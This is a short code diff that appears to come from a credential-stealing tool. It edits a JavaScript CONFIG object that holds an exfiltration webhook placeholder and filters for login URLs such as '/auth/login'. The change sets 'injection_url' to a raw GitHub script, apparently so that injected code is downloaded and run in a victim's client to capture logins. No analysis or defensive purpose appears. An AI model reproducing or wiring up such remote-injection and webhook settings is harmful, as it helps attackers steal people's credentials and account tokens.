@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "",
+    injection_url: "https://raw.githubusercontent.com/rodafaas7/injection/main/index.js",
     filters: {
         urls: [
             '/auth/login',
